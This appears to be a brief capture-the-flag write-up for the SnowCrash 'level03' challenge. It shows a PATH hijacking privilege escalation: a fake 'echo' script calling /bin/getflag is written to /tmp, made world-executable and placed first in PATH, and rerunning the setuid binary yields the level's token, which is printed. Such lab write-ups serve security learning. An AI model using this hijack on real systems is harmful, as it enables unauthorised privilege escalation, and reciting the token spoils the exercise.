Run strings (after trying 2478954287561 other cmd) on level03
we see it use echo and it as exe perm on usr/bin
we create a new fake echo in tmp and giving all user exc permission
```
echo "/bin/getflag" > /tmp/echo
chmod 777 /tmp/echo
```
and we had it in first position of PATH
```
export PATH=/tmp:$PATH
```
rerun level03
```
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
